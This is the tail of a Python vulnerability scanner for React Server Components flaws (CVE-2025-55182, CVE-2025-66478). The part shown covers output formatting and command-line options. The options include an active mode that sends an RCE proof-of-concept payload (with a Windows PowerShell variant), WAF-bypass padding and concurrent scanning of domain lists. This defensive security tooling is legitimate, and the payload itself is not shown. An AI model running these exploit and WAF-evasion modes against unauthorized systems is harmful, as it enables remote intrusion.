                vuln_indicator = ""
                if r.vulnerability_status == VulnerabilityStatus.CONFIRMED:
                    vuln_indicator = " \033[91m[VULNERABLE]\033[0m"
                elif r.vulnerability_status == VulnerabilityStatus.LIKELY:
                    vuln_indicator = " \033[93m[LIKELY VULNERABLE]\033[0m"
                elif r.vulnerability_status == VulnerabilityStatus.MITIGATED:
                    vuln_indicator = " \033[92m[MITIGATED]\033[0m"

                print(f"\n  {risk_indicator}{vuln_indicator} {r.url}")
                print(f"     Status: {r.status_code}")
                print(f"     Content-Type: {r.content_type}")
                if r.framework:
                    print(f"     Framework: {r.framework}")
                if r.has_server_actions:
                    print(f"     Server Actions: DETECTED")
                if r.mitigation_detected:
                    print(f"     Mitigation: {r.mitigation_detected}")
                if r.verification_details:
                    print(f"     Verification: {r.verification_details}")
                print(f"     RSC Indicators: {', '.join(r.rsc_indicators[:5])}")
                if len(r.rsc_indicators) > 5:
                    print(f"                     ... and {len(r.rsc_indicators) - 5} more")
                if r.response_time_ms:
                    print(f"     Response Time: {r.response_time_ms:.0f}ms")

            print("\n" + "-" * 70)
            if confirmed:
                print("[!!!] CONFIRMED VULNERABILITIES FOUND")
                print("      These endpoints are exploitable for RCE.")
            elif likely:
                print("[!!] LIKELY VULNERABLE ENDPOINTS FOUND")
                print("     Side-channel detection indicates vulnerability.")
            else:
                print("[*] RSC ENDPOINTS DETECTED (Passive Scan)")
                print("    These are potential attack surfaces - not confirmed vulnerable.")
                print("    Use --verify or --safe-check to confirm exploitability.")

            print("\n    Related CVEs:")
            print("    - CVE-2025-55182 (React2Shell) - RCE via Flight protocol")
            print("    - CVE-2025-66478 - Next.js server action vulnerability")
            print("\n    Vulnerable versions: React 19.0.0, 19.1.0, 19.1.1, 19.2.0")
            print("\n    Recommended actions:")
            print("    1. Run with --verify or --safe-check to confirm vulnerability")
            print("    2. Upgrade to patched versions: 19.0.1, 19.1.2, or 19.2.1+")
            print("    3. Update Next.js to latest patched version")
            print("    4. Review server action implementations")
        else:
            print("\n[+] No RSC endpoints detected in scan.")

        print(f"\n[*] Summary: {len(results)} URLs scanned, {len(rsc_endpoints)} RSC endpoints, {len(errors)} errors")

        if output_file:
            data = {
                "scan_time": datetime.now(timezone.utc).isoformat(),
                "results": [],
            }
            for r in results:
                result_dict = asdict(r)
                result_dict["risk_level"] = r.risk_level.value
                result_dict["vulnerability_status"] = r.vulnerability_status.value
                result_dict.pop("response_headers", None)
                data["results"].append(result_dict)

            with open(output_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
            print(f"[+] Detailed results saved to {output_file}")


def main():
    parser = argparse.ArgumentParser(
        description="Advanced RSC Vulnerability Scanner - CVE-2025-55182 & CVE-2025-66478",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Passive detection (safe, no exploitation)
  %(prog)s example.com
  %(prog)s -f subdomains.txt -c 50 -o results.json

  # Active verification (sends PoC payload)
  %(prog)s example.com --verify
  %(prog)s example.com --verify --windows  # For Windows targets

  # Safe side-channel check (non-exploitative verification)
  %(prog)s example.com --safe-check

  # With WAF bypass
  %(prog)s example.com --verify --waf-bypass
  %(prog)s example.com --verify --vercel-waf-bypass

  # Deep scan with all paths
  %(prog)s example.com --deep --verify

IMPORTANT: Only scan domains you own or have explicit authorization to test.
        """
    )

    parser.add_argument(
        "domains",
        nargs="*",
        help="Domain(s) to scan (e.g., example.com api.example.com)",
    )
    parser.add_argument(
        "-f", "--file",
        help="File containing domains to scan (one per line)",
    )
    parser.add_argument(
        "-c", "--concurrency",
        type=int,
        default=20,
        help="Number of concurrent requests (default: 20)",
    )
    parser.add_argument(
        "-t", "--timeout",
        type=float,
        default=10.0,
        help="Request timeout in seconds (default: 10)",
    )
    parser.add_argument(
        "--rate-limit",
        type=float,
        default=0.0,
        help="Delay between requests in seconds (default: 0)",
    )
    parser.add_argument(
        "--paths",
        help="Comma-separated list of paths to check",
    )
    parser.add_argument(
        "--no-default-paths",
        action="store_true",
        help="Don't use default RSC paths, only use --paths",
    )
    parser.add_argument(
        "--deep",
        action="store_true",
        help="Enable deep scanning with additional paths",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output file path",
    )
    parser.add_argument(
        "--format",
        choices=["console", "json", "csv"],
        default="console",
        help="Output format (default: console)",
    )
    parser.add_argument(
        "--rsc-only",
        action="store_true",
        help="Only show/output RSC endpoint results",
    )
    parser.add_argument(
        "--no-verify-ssl",
        action="store_true",
        help="Disable SSL certificate verification",
    )
    parser.add_argument(
        "--no-progress",
        action="store_true",
        help="Disable progress reporting",
    )

    # Verification options
    verify_group = parser.add_argument_group("Verification Options")
    verify_group.add_argument(
        "--verify",
        action="store_true",
        help="Active verification mode - sends RCE PoC payload (use with caution)",
    )
    verify_group.add_argument(
        "--safe-check",
        action="store_true",
        help="Safe side-channel verification (non-exploitative)",
    )
    verify_group.add_argument(
        "--windows",
        action="store_true",
        help="Use Windows PowerShell payload (with --verify)",
    )

    # WAF bypass options
    waf_group = parser.add_argument_group("WAF Bypass Options")
    waf_group.add_argument(
        "--waf-bypass",
        action="store_true",
        help="Add junk data to bypass WAF content inspection",
    )
    waf_group.add_argument(
        "--waf-bypass-size",
        type=int,
        default=128,
        metavar="KB",
        help="Size of junk data in KB (default: 128)",
    )
    waf_group.add_argument(
        "--vercel-waf-bypass",
        action="store_true",
        help="Use Vercel-specific WAF bypass payload",
    )

    args = parser.parse_args()

    # Validate arguments
    if args.verify and args.safe_check:
        print("[!] Error: Cannot use both --verify and --safe-check")
        sys.exit(1)

    # Collect domains
    domains: List[str] = []
    if args.domains:
        domains.extend(args.domains)
    if args.file:
        domains.extend(load_domains_from_file(args.file))

    if not domains:
        parser.print_help()
        print("\n[!] Error: No domains specified")
        sys.exit(1)

    # Handle paths
    paths = None
    if args.paths:
        custom_paths = [p.strip() for p in args.paths.split(",") if p.strip()]
        if args.no_default_paths:
            paths = custom_paths
        else:
            paths = list(set(DEFAULT_RSC_PATHS + custom_paths))
    elif args.no_default_paths:
        print("[!] Error: --no-default-paths requires --paths")
        sys.exit(1)

    # Create scanner
    scanner = RSCScanner(
        concurrency=args.concurrency,
        timeout=args.timeout,
        rate_limit=args.rate_limit,
        paths=paths,
        verify_ssl=not args.no_verify_ssl,
        deep_scan=args.deep,
        verify_mode=args.verify,
        safe_check=args.safe_check,
        windows=args.windows,
        waf_bypass=args.waf_bypass,
        waf_bypass_size_kb=args.waf_bypass_size,
        vercel_waf_bypass=args.vercel_waf_bypass,
    )

    # Print banner
    print(f"\n{'=' * 70}")
    print("RAPTICORE SECURITY RESEARCH - RSC Vulnerability Scanner")
    print("CVE-2025-55182 & CVE-2025-66478 (React2Shell)")
    print(f"{'=' * 70}")
    print(f"[*] Starting scan at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    if args.deep:
        print("[*] Deep scan mode enabled")
    if args.verify:
        print("[*] \033[93mACTIVE VERIFICATION MODE - Sends exploitation payload\033[0m")
    if args.safe_check:
        print("[*] Safe side-channel check mode")

    try:
        results = asyncio.run(scanner.scan(domains, show_progress=not args.no_progress))
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        results = scanner.results

    # Output results
    output_results(
        results,
        rsc_only=args.rsc_only,
        format=args.format,
        output_file=args.output,
        frameworks_detected=scanner.frameworks_detected,
        verify_mode=args.verify,
        safe_check=args.safe_check,
    )

    # Exit with code 1 if vulnerabilities confirmed
    if scanner.verified_vulnerable:
        sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    main()
